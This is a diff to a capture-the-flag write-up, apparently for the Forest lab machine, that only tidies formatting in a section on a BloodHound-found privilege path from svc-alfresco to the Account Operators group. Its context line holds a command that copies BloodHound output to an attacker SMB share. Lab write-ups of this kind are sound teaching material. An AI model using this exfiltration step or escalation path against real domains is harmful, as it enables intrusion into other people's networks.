@@ -245,9 +245,9 @@ copy 20220911135329_BloodHound.zip \\10.10.16.17\smb
 
 ### PrivEsc vector
 
-* My query/analysis configuration to achieve this layout is the <mark style="color:yellow;"></mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">**"Shortest Paths to Domain Admins from Owned Principals"**</mark>
+* My query/analysis configuration to achieve this layout is the <mark style="color:yellow;">**"Shortest Paths to Domain Admins from Owned Principals"**</mark>
 
-<figure><img src="../../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * We see that <mark style="color:yellow;">svc-alfresco</mark> is a member of the <mark style="color:yellow;">SERVICE ACCOUNTS</mark> group who is a member of <mark style="color:yellow;">PRIVILEGED IT ACCOUNTS</mark> who is a member of <mark style="color:red;">ACCOUNT OPERATORS</mark>.
   * <mark style="color:red;">ACCOUNT OPERATORS</mark> is a special group in Windows where you can create accounts and place them into different groups.
